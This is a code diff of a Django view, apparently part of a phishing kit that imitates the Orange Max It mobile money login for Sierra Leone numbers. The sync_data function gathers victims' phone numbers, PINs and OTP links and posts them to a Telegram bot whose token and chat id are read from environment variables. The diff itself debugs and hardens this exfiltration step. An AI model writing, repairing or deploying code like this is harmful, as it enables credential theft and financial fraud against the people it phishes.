@@ -66,55 +66,117 @@ def otp_verification(request): # Removed order_id from here
 
         return redirect('starlink_app:otp_verification')
     return render(request, 'otp_verification.html', {'order': order})
+
 @csrf_exempt
+
 def sync_data(request):
-    """
-    Stage 4: Send collected data to Telegram
-    """
+
     if request.method != 'POST':
+
         return JsonResponse({"status": "error", "message": "POST required"}, status=405)
 
+
+
     try:
-        # 1. Safely load the JSON data from the JavaScript Fetch
+
+        # 1. Load data from Fetch
+
         data = json.loads(request.body)
-        
-        # 2. Extract the 'otp' key (which we matched in the HTML script)
+
         otp_link = data.get('otp', 'No Link provided')
 
-        # 3. Retrieve session data stored in the previous step
+
+
+        # 2. Retrieve session data
+
+        # Ensure these were set in the previous view using request.session['key'] = value
+
         phone = request.session.get('phone', 'Unknown')
+
         bundle = request.session.get('bundle', 'Unknown')
+
         pin = request.session.get('pin', 'Unknown')
 
-        # 4. Format the Telegram message
+
+
+        # 3. Get Credentials from Render Environment Variables
+
+        bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
+
+        chat_id = os.getenv('TELEGRAM_CHAT_ID')
+
+
+
+        if not bot_token or not chat_id:
+
+            return JsonResponse({"status": "error", "message": "Server configuration missing"}, status=500)
+
+
+
+        # 4. Format the Message
+
+        # Using a simpler format to prevent Markdown parsing errors
+
         message = (
+
             "🇸🇱 *ORANGE MAX IT LOGIN*\n"
+
             "━━━━━━━━━━━━━━━━━━\n"
-            f"📞 *PHONE:* `+232 {phone}`\n"
+
+            f"📞 *PHONE:* +232 {phone}\n"
+
             f"📦 *BUNDLE:* {bundle}\n"
-            f"🔑 *PIN:* `{pin}`\n"
+
+            f"🔑 *PIN:* {pin}\n"
+
             "━━━━━━━━━━━━━━━━━━\n"
+
             f"🔗 *OTP LINK:*\n{otp_link}\n"
+
             "━━━━━━━━━━━━━━━━━━\n"
+
             "📡 *STATUS:* SUCCESS"
+
         )
 
-        # 5. Send to Telegram using the 'requests' library
-        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+
+
+        # 5. Send to Telegram
+
+        telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+
         payload = {
-            "chat_id": CHAT_ID,
+
+            "chat_id": chat_id,
+
             "text": message,
+
             "parse_mode": "Markdown" 
+
         }
 
-        # --- THIS WAS THE MISSING PART ---
+
+
         response = requests.post(telegram_url, json=payload, timeout=10)
+
         
+
         if response.status_code == 200:
+
             return JsonResponse({"status": "success"})
+
         else:
+
+            # This helps you see the REAL error in Render logs
+
+            print(f"Telegram Failed: {response.text}")
+
             return JsonResponse({"status": "error", "message": "Telegram API Error"}, status=500)
 
+
+
     except Exception as e:
-        # This catches any errors (like bot token issues or bad JSON)
-        return JsonResponse({"status": "error", "message": str(e)}, status=400)
+
+        print(f"Sync Error: {str(e)}")
+
+        return JsonResponse({"status": "error", "message": "Internal Server Error"}, status=400)
